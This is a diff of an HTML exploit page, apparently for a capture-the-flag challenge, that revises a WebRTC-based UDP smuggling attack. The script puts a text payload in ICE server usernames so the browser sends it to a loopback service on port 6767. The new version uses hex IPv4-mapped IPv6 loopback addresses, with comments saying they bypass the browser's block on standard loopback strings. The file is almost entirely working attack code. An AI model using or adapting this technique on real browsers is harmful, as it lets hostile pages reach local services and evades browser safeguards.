@@ -1,42 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit Matrix V2</title>
+    <title>Bypass Matrix V3</title>
 </head>
 <body>
-    <h1>Smuggling UDP Payloads...</h1>
+    <h1>Bypassing Sandbox Restrictions...</h1>
     <script>
-        // Prefixing with a newline drops the browser binary junk bytes into line 1.
-        // Line 2 becomes our clean text payload.
         const payload = "\ngive me the flag bro\n";
 
-        function sendSmuggledIce(targetUri) {
+        function sendPacket(target) {
             try {
                 const pc = new RTCPeerConnection({
                     iceServers: [{
-                        urls: targetUri,
-                        username: payload, // The browser pushes this into the packet
+                        urls: target,
+                        username: payload,
                         credential: "x"
                     }]
                 });
-                pc.createDataChannel("trigger");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            } catch (e) {}
+                pc.createDataChannel("data");
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+            } catch(e) {}
         }
 
-        // Test every loopback configuration with the line break fix
-        const vectors = [
-            "turn:[::1]:6767",
-            "turn:127.0.0.1:6767",
-            "stun:[::1]:6767",
-            "stun:127.0.0.1:6767"
+        // Using complex hexadecimal representations of the loopback interface
+        // to bypass the browser's block against standard "127.0.0.1" and "[::1]" text tokens.
+        const blindVectors = [
+            "turn:[0000:0000:0000:0000:0000:ffff:7f00:0001]:6767", // Full hex IPv4 loopback mapping
+            "stun:[0000:0000:0000:0000:0000:ffff:7f00:0001]:6767",
+            "turn:[::ffff:7f00:1]:6767",
+            "stun:[::ffff:7f00:1]:6767"
         ];
 
-        vectors.forEach((uri, i) => {
-            setTimeout(() => sendSmuggledIce(uri), i * 100);
+        blindVectors.forEach((uri, i) => {
+            setTimeout(() => sendPacket(uri), i * 100);
         });
 
-        // Terminate browser execution smoothly after 2 seconds to release thread
+        // Autoclose to free the thread
         setTimeout(() => {
             window.location.href = "about:blank";
         }, 2000);
